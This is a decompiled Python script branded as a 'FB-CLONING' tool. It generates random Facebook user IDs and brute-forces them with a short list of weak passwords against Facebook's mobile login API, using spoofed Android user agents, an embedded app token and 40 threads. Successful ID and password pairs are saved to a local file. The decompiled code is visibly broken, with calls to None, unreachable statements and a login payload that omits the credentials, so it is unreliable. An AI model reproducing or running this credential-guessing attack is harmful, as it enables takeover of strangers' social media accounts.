# Source Generated with ShoaibxAmer Pycdc
# File: 2009_V2.pyc (Python 3.12)

import requests
import bs4
import json
import os
import sys
import uuid
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os
import time
import random
import json
import sys
import datetime
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('xdg-open https://facebook.com/groups/412641030225365/')

def lin():
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
date = str(tgl) + '-' + str(bln)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx - 12
    tag = 'PM'
a = ltx
tag = 'AM'
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

def ua():
    rr = random.randint
    aZ = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    zA = random.choice([
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'g',
        'h',
        'i',
        'j',
        'k',
        'l',
        'm',
        'n',
        'o',
        'p',
        'q',
        'r',
        's',
        't',
        'u',
        'v',
        'w',
        'x',
        'y',
        'z'])
    rx = random.randrange(1, 999)
    xx = f'''Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'''
    return xx


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'''5{bx}.{bV}'''
    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice([
        '2',
        '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'''5{cx}.{cV}'''
    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice([
        '2',
        '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
    D = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'''
    return random.choice([
        A,
        B,
        C,
        D])


def randBuildLSB():
    vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
    VAPP = random.randint(410000000, 499999999)
    END = '[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07,width=1080,height=2460};FBLC/en_US;FBCR/Freenet;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;] '
    ua = random.choice([
        'Dalvik/2.1.0 (Linux; U; Android 9; Viva_1003G Build/PPR1.180610.011)',
        'Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2322G Build/SKQ1.220213.001)',
        'Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-81-10)',
        'Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R112-15359.58.0)',
        'Dalvik/2.1.0 (Linux; U; Android 13; SM-A3460 Build/TP1A.220624.014)',
        'Dalvik/2.1.0 (Linux; U; Android 13; V2239 Build/TP1A.220624.014)',
        'Dalvik/2.1.0 (Linux; U; Android 11; S1 Build/RP1A.201005.001)',
        'Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003)',
        'Dalvik/2.1.0 (Linux; U; Android 13; Bengal for arm64 Build/TKQ1.221013.002)',
        'Dalvik/2.1.0 (Linux; U; Android 7.0; X12 Build/NRD90M)',
        'Dalvik/2.1.0 (Linux; U; Android 13; CPH2465 Build/RKQ1.211119.001)',
        'Dalvik/2.1.0 (Linux; U; Android 11; Q9.r1.00.6330_642.d4 Build/RP1A.201105.002)',
        'Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.45.0)',
        'Dalvik/2.1.0 (Linux; U; Android 13; Subsystem for Android(TM) Build/TQ2A.230305.008.C1)',
        'Dalvik/2.1.0 (Linux; U; Android 13; TECNO KI7 Build/TP1A.220624.014)',
        'Dalvik/2.1.0 (Linux; U; Android 8.1.0; N210 Build/OPM2.171019.012)',
        'Dalvik/2.1.0 (Linux; U; Android 5.1; i1002SK Build/LMY47I)',
        'Dalvik/2.1.0 (Linux; U; Android 11; Hisense E20s Build/RP1A.201005.001)',
        'Dalvik/2.1.0 (Linux; U; Android 10; Primo E12 Build/QP1A.190711.020)',
        'Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQ32.20-42-10-1)',
        'Dalvik/1.6.0 (Linux; U; Android 4.2.2; SBM303SH Build/S0034)',
        'Dalvik/2.1.0 (Linux; U; Android 12; V22S Build/SP1A.210812.016)',
        'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
        'Dalvik/2.1.0 (Linux; U; Android 8.0.0; Moto Z (2) Build/OPXS27.109-40-22)',
        'Dalvik/2.1.0 (Linux; U; Android 11; AT70K Build/RP1A.201005.006)',
        'Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-42)',
        'Dalvik/2.1.0 (Linux; U; Android 11; RMX3506 Build/RP1A.201005.001)',
        'Dalvik/2.1.0 (Linux; U; Android 13; 21051182C Build/TKQ1.221013.002)',
        'Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC62 Build/61.2.A.0.410)',
        'Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVE21A Build/RTM2.210929.167)',
        'Dalvik/2.1.0 (Linux; U; Android 8.0.0; MBX4K Ranger Build/NHG47L)',
        'Dalvik/2.1.0 (Linux; U; Android 13; SM-G770F Build/TP1A.220624.014; BroadcastDotRadioApp )',
        'Dalvik/2.1.0 (Linux; U; Android 10; VOG-TL00 Build/HUAWEIDRA-LX9)',
        'Dalvik/2.1.0 (Linux; U; Android 8.1.0; S23 Ultra Build/O11019)',
        'Dalvik/2.1.0 (Linux; U; Android 9; UK 4K Android TV Build/PTO6.220926.001)',
        'Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Pro Build/SP1A.210812.016)',
        'Dalvik/2.1.0 (Linux; U; Android 10; LT600T Build/QKQ1.200216.002)',
        'Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S116H)',
        'Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/T3B2.230316.003)',
        'Dalvik/2.1.0 (Linux; U; Android 5.1; Ixion ES350 Build/DEXP)',
        'Dalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)',
        'Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)',
        'Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)',
        'Dalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)',
        'Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)',
        'Dalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)',
        'Dalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)',
        'Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)',
        'Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)',
        'Dalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)',
        'Dalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)',
        'Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)',
        'Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)',
        'Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)',
        'Dalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)',
        'Dalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)',
        'Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)',
        'Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)',
        'Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)',
        'Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)',
        'Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)',
        'Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)',
        'Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)',
        'Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)',
        'Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)',
        'Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)',
        'Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)',
        'Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)',
        'Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)',
        'Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)',
        'Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)',
        'Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)',
        'Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)',
        'Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)',
        'Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)',
        'Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)',
        'Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)',
        'Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)',
        'Dalvik/2.1.0 (Linux; U; Android 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
        'Dalvik/2.1.0 (Linux; U; Android 13; SM-G9880 Build/TP1A.220624.014)',
        'Dalvik/2.1.0 (Linux; U; Android 11; T10W2 Build/RP1A.201105.002)',
        'Dalvik/2.1.0 (Linux; U; Android 13; SM-A346M Build/TP1A.220624.014)',
        'Dalvik/2.1.0 (Linux; U; Android 11; CORN X55 Build/RP1A.201005.001)',
        'Dalvik/2.1.0 (Linux; U; Android 5.1.1; PO-10034 Build/LMY47V)',
        'Dalvik/2.1.0 (Linux; U; Android 11; 2209116AG Build/RKQ1.200826.002)',
        'Dalvik/2.1.0 (Linux; U; Android 7.1.2; DroidBox Build/NHG47L)',
        'Dalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTAS29.401-25-3)',
        'Dalvik/2.1.0 (Linux; U; Android 11; Motorola Defy Build/RZD31.31)',
        'Dalvik/2.1.0 (Linux; U; Android 10; HEYOU20 Build/QKQ1.191008.001)',
        'Dalvik/2.1.0 (Linux; U; Android 11; U55 Build/RP1A.200720.011)',
        'Dalvik/2.1.0 (Linux; U; Android 8.1.0; px30_evb Build/OPM8.190505.001)',
        'Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3-1)',
        'Dalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-2-2)',
        'Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-1)',
        'Dalvik/2.1.0 (Linux; U; Android 12; A003SH Build/S2010)',
        'Dalvik/2.1.0 (Linux; U; Android 9; VOG-L04 Build/HUAWEIVOG-L04)',
        'Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-64-14)',
        'Dalvik/2.1.0 (Linux; U; Android 11; JAD-LX9 Build/HUAWEIJAD-L09)',
        'Dalvik/2.1.0 (Linux; U; Android 12; V2202 Build/SP1A.210812.003_SC)',
        'Dalvik/2.1.0 (Linux; U; Android 10.1; T99 Build/QP1A.191105.004)']) + END
    return ua


def generate_user_agent():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
    rx = random.randrange(1, 999)
    return f'''Mozilla/5.0 (Windows NT {rr(9, 11)}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){rr(99, 149)}.0.{rr(4500, 4999)}.{rr(35, 99)} Chrome/{rr(99, 175)}.0.{rr(0, 5)}.{rr(0, 5)} Safari/537.36'''

logo = '\n   \x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████  \n   \x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████  \n   \x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██ \n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mSHOHAG-KHAN\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92mCEO卝 CYBERツ࿐\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mFREE\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL    \x1b[1;91m   :   \x1b[1;92mFB-CLONING\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'

def main():
    user = []
    os.system('clear')
    print(logo)
    print('\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;37mEXAMPLE   : \x1b[1;37m9999 | 20000 | 90000')
    lin()
    limit = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
    lin()
    os.system('clear')
    print(logo)
    print('\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mMETHOD ~ (2009-2010')
    lin()
    ask = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
    lin()
    if ask in ('1',):
        star = '10000'
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 1999999999)))
            user.append(data)
            star = '100000'
            for i in range(int(limit)):
                data = str(random.choice(range(1000000000, 1999999999)))
                user.append(data)
                MrDevilEx = ThreadPool(max_workers = 40)
                os.system('clear')
                print(logo)
                print(f'''\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mMETHOD : \x1b[38;5;86m{ask}''')
                print('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mVPN.1.1.1 \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mLOGIN METHOD-USE-VPN-111')
                lin()
                for mal in user:
                    uid = star + mal
                    MrDevilEx.submit(login, uid)
                    None(None, None)
                    return None
                    if not None:
                        pass

loop = 0
oks = []

def login(uid):
    global loop
    Session = requests.session()
    sys.stdout.write(f'''\r\x1b[38;5;8m(\x1b[1;97m{date}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{loop}\x1b[38;5;8m) \x1b[38;5;8m\x1b[1;32mOK (\x1b[1;97m{len(oks)}\x1b[38;5;8m)''')
    sys.stdout.flush()
    for pw in ('123456', '12345678', '123123', '0987654321', '123123', '654321', '87654321', '7654321', '000000', '111111', '143143', '111222', '112233'):
        data = {
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        head = {
            'content-type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent': ua(),
            'accept-encoding': 'gzip, deflate',
            'x-fb-http-engine': 'Liger' }
        url = 'https://b-api.facebook.com/auth/login'
        response = Session.post(url, data = data, headers = head, verify = True).json()
        if 'access_token' in response:
            print(f'''\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}''')
            open('/sdcard/MrDevilEx-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid + '|' + pw)
            'auth.login'
        if not 'www.facebook.com' in response.get('error', { }).get('message', ''):
            pass
        print(f'''\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}''')
        open('/sdcard/MrDevilEx-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
        oks.append(uid + '|' + pw)
        'method'
        loop += 1
        return None
        if Exception:
            e = str(uuid.uuid4())
            e = None
            del e
            return None
            e = None
            del e

main()
return None
os.system('pip3 install requests')
import requests
